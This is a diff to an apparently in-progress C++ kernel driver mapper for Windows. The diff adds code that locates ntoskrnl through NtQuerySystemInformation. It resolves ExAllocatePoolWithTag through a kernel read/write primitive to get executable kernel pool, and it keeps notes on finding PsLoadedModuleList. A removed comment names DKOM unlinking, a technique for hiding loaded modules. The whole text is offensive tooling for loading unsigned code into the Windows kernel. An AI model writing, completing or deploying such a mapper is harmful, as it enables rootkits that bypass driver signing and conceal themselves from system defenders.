@@ -27,6 +27,10 @@ typedef struct _IMAGE_THUNK_DATA64 { uint64_t u1; } IMAGE_THUNK_DATA64, *PIMAGE_
 typedef struct _IMAGE_IMPORT_BY_NAME { uint16_t Hint; char Name[1]; } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;
 typedef struct _IMAGE_BASE_RELOCATION { uint32_t VirtualAddress; uint32_t SizeOfBlock; } IMAGE_BASE_RELOCATION, *PIMAGE_BASE_RELOCATION;
 typedef struct _IMAGE_EXPORT_DIRECTORY { uint32_t Characteristics; uint32_t TimeDateStamp; uint16_t MajorVersion; uint16_t MinorVersion; uint32_t Name; uint32_t Base; uint32_t NumberOfFunctions; uint32_t NumberOfNames; uint32_t AddressOfFunctions; uint32_t AddressOfNames; uint32_t AddressOfNameOrdinals; } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
+typedef struct _SYSTEM_MODULE_ENTRY { uintptr_t Section; uintptr_t MappedBase; uintptr_t ImageBase; uint32_t ImageSize; uint32_t Flags; uint16_t LoadOrderIndex; uint16_t InitOrderIndex; uint16_t LoadCount; uint16_t OffsetToFileName; uint8_t FullPathName[256]; } SYSTEM_MODULE_ENTRY, *PSYSTEM_MODULE_ENTRY;
+typedef struct _SYSTEM_MODULE_INFORMATION { uint32_t Count; SYSTEM_MODULE_ENTRY Module[1]; } SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
+typedef enum _SYSTEM_INFORMATION_CLASS { SystemModuleInformation = 11 } SYSTEM_INFORMATION_CLASS;
+typedef NTSTATUS (NTAPI *PNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
 #pragma pack(pop)
 
 static BOOL read_file(const wchar_t* path, std::vector<uint8_t>& out) {
@@ -99,15 +103,40 @@ static uintptr_t resolve_kernel_export(primitive::KernelRW& rw, uintptr_t module
     return 0;
 }
 
-// Get the base address of ntoskrnl.exe from the registry or by scanning.
-// Simplified: we use a known approach - read from PsLoadedModuleList via the
-// kernel, or use NtQuerySystemInformation. For now we use a hardcoded scan.
-static uintptr_t get_ntoskrnl_base(primitive::KernelRW& rw) {
-    // Try to find ntoskrnl base via the registry or system information.
-    // Simplified approach: scan for the MZ signature in kernel range.
-    // This is a placeholder; in practice use NtQuerySystemInformation
-    // SystemModuleInformation to get the base.
-    return 0; // Will be filled by caller
+// Get the base address of ntoskrnl.exe using NtQuerySystemInformation
+// SystemModuleInformation. Returns 0 if detection fails.
+static uintptr_t get_ntoskrnl_base() {
+    HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
+    if (!hNtDll) return 0;
+
+    PNtQuerySystemInformation NtQuerySystemInformation =
+        (PNtQuerySystemInformation)GetProcAddress(hNtDll, "NtQuerySystemInformation");
+    if (!NtQuerySystemInformation) return 0;
+
+    ULONG size = 0;
+    // First call to get required buffer size
+    NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &size);
+    if (size == 0) return 0;
+
+    std::vector<uint8_t> buffer(size);
+    NTSTATUS status = NtQuerySystemInformation(
+        SystemModuleInformation, buffer.data(), size, NULL
+    );
+    if (status != 0) return 0;
+
+    PSYSTEM_MODULE_INFORMATION pModInfo =
+        reinterpret_cast<PSYSTEM_MODULE_INFORMATION>(buffer.data());
+
+    for (uint32_t i = 0; i < pModInfo->Count; i++) {
+        // Find ntoskrnl.exe by filename
+        const char* name = reinterpret_cast<const char*>
+            (&pModInfo->Module[i].FullPathName[pModInfo->Module[i].OffsetToFileName]);
+        if (strstr(name, "ntoskrnl.exe") != nullptr) {
+            return pModInfo->Module[i].ImageBase;
+        }
+    }
+
+    return 0;
 }
 
 int wmain(int argc, wchar_t* argv[]) {
@@ -148,35 +177,33 @@ int wmain(int argc, wchar_t* argv[]) {
     uint64_t imageSize = nt->OptionalHeader.SizeOfImage;
     fwprintf(stderr, L"[+] Driver SizeOfImage: 0x%llX\n", imageSize);
 
-    // Allocate executable non-paged kernel pool.
-    // We need to find ExAllocatePoolWithTag in ntoskrnl and call it.
-    // For now, we allocate via PhysicalMemory by writing to a known pool
-    // location or by calling the kernel allocator.
-    // Simplified: allocate a chunk in kernel memory.
-
-    fwprintf(stderr, L"[!] Kernel pool allocation requires ntoskrnl base and ExAllocatePoolWithTag\n");
-    fwprintf(stderr, L"[!] Pass ntoskrnl base as second argument to continue\n");
-
+    // Auto-detect ntoskrnl base, or use command-line argument
+    uintptr_t ntoskrnlBase = 0;
     if (argc >= 3) {
-        uintptr_t ntoskrnlBase = std::stoull(argv[2], nullptr, 16);
-        fwprintf(stderr, L"[+] Using ntoskrnl base: 0x%llX\n", ntoskrnlBase);
-
-        // Resolve ExAllocatePoolWithTag
-        uintptr_t exAllocPool = resolve_kernel_export(rw, ntoskrnlBase, "ExAllocatePoolWithTag");
-        if (exAllocPool) {
-            fwprintf(stderr, L"[+] ExAllocatePoolWithTag at 0x%llX\n", exAllocPool);
+        ntoskrnlBase = std::stoull(argv[2], nullptr, 16);
+        fwprintf(stderr, L"[+] Using command-line ntoskrnl base: 0x%llX\n", ntoskrnlBase);
+    } else {
+        ntoskrnlBase = get_ntoskrnl_base();
+        if (ntoskrnlBase) {
+            fwprintf(stderr, L"[+] Auto-detected ntoskrnl base: 0x%llX\n", ntoskrnlBase);
         } else {
-            fwprintf(stderr, L"[-] Failed to resolve ExAllocatePoolWithTag\n");
+            fwprintf(stderr, L"[-] Failed to auto-detect ntoskrnl base\n");
+            primitive::kernel_rw_close(rw);
+            return 1;
         }
-
-        // Resolve PsLoadedModuleList for DKOM unlinking
-        uintptr_t psLoadedModuleList = resolve_kernel_export(rw, ntoskrnlBase, "PsLoadedModuleList");
-        // Note: PsLoadedModuleList is not an export, it's a global symbol.
-        // We'd need to scan for it or use a different approach.
-        fwprintf(stderr, L"[!] PsLoadedModuleList is a global, not an export - need pattern scan\n");
     }
 
-    primitive::kernel_rw_close(rw);
+    // Resolve ExAllocatePoolWithTag
+    uintptr_t exAllocPool = resolve_kernel_export(rw, ntoskrnlBase, "ExAllocatePoolWithTag");
+    if (exAllocPool) {
+        fwprintf(stderr, L"[+] ExAllocatePoolWithTag at 0x%llX\n", exAllocPool);
+    } else {
+        fwprintf(stderr, L"[-] Failed to resolve ExAllocatePoolWithTag\n");
+    }
+
+    fwprintf(stderr, L"[!] PsLoadedModuleList is a global, not an export - need pattern scan\n");
     fwprintf(stderr, L"[+] Mapper framework ready.\n");
+
+    primitive::kernel_rw_close(rw);
     return 0;
 }
